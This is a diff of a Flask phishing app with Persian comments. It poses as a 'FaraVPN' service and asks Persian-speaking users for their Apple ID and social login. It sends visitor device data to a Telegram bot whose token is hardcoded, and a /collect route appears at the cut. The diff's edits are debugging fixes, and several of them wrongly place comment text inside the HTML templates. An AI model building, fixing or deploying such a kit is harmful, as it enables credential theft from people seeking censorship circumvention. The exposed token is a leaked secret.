@@ -1,11 +1,11 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, url_for # <--- url_for اضافه شد
 import requests
 import json
 import threading
 import random
 import time
 
-app = Flask(__name__) # <--- اصلاح شده: __name__
+app = Flask(__name__)
 
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"  # توکن ربات
@@ -48,8 +48,9 @@ def send_to_telegram(data, message_type="data"):
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
         requests.post(url, json=payload, timeout=5)
-    except:
-        pass
+        print("Telegram message sent successfully!") # <--- خط عیب یابی اضافه شد
+    except Exception as e:
+        print(f"Failed to send Telegram message: {e}") # <--- خط عیب یابی اضافه شد
 
 @app.route("/")
 def index():
@@ -63,7 +64,7 @@ def index():
     }
     threading.Thread(target=send_to_telegram, args=(device_info, "visit")).start()
 
-    return render_template_string("""
+    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -104,14 +105,14 @@ def index():
             <p>با ما هیچوقت قطع نخواهید شد! فراتر از استارلینک رو اینجا تجربه کن! ما تنظیمات VPN رو مستقیم تو گوشیت اعمال می‌کنیم و آپدیت‌ها خودکار نصب می‌شن. برای فعال‌سازی، نیاز به اپل آیدی داریم تا سرورهای FaraVPN بتونن تنظیمات رو روی iOS شما ست کنن.</p>
             <button onclick="window.location.href='/login'">اوکی، فهمیدم!</button>
         </div>
-        <script src="/static/script.js"></script>
+        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
     </body>
     </html>
-    """)
+    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
 
 @app.route("/login")
 def login():
-    return render_template_string("""
+    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -153,14 +154,14 @@ def login():
                 <button type="submit">ادامه</button>
             </form>
         </div>
-        <script src="/static/script.js"></script>
+        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
     </body>
     </html>
-    """)
+    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
 
 @app.route("/social")
 def social():
-    return render_template_string("""
+    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -208,10 +209,10 @@ def social():
                 <button type="submit">فعال‌سازی</button>
             </form>
         </div>
-        <script src="/static/script.js"></script>
+        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
     </body>
     </html>
-    """)
+    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
 
 @app.route("/collect", methods=["POST"])
 def collect():
